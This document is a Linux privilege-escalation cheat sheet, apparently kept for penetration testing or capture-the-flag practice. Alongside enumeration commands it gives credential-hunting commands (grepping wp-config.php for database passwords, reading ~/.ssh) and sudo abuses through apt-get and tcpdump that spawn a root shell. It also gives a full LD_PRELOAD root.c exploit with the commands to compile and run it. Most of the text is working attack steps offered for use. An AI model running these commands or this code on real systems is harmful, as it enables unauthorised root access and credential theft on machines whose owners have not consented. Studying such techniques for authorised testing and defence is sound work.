
### Simple things to do when you get on the box

##### List Current Processes
```bash
ps aux | grep root
ps au
```
##### Check out the the user, home dir and history
```bash
ls -la /home/winston
history
sudo -l
ls -la /etc/cron.daily/
lsblk
```
##### Writeable dirs or files?
```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
##### What am I on?
```bash
uname -a
cat /etc/lsb-release
```
#### Simple kerenel expoit with gcc
```bash
gcc kernel_expoit.c -o kernel_expoit && chmod +x kernel_expoit
```
##### pspy
```bash
https://github.com/DominicBreuker/pspy
./pspy64 -pf -i 1000
```
##### Set User ID BIT
```bash
The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.
find / -user root -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
or by group
find / -uid 0 -perm -6000 -type f 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
##### Check the front door
```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
sudo -l (Find what user can execute without a pass and) search the man to use -postrotate-command option.
ex: sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
##### Path Abuse
```bash
check the contents of the PATH variable
env | grep PATH
echo $PATH
```
##### Cred Hunting
```bash
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
for spool or mail directories
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh
```
##### LD_PRELOAD Privilege Escalation
```bash
sudo -l, see apache2 runs /usr/sbin/apache2
compile the root.c exploit
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

### Kernel Exploits
```bash
Ubuntu 16.04.4 kernel priv esc - https://vulners.com/zdt/1337DAY-ID-30003
Screen Version 4.5.0 
```
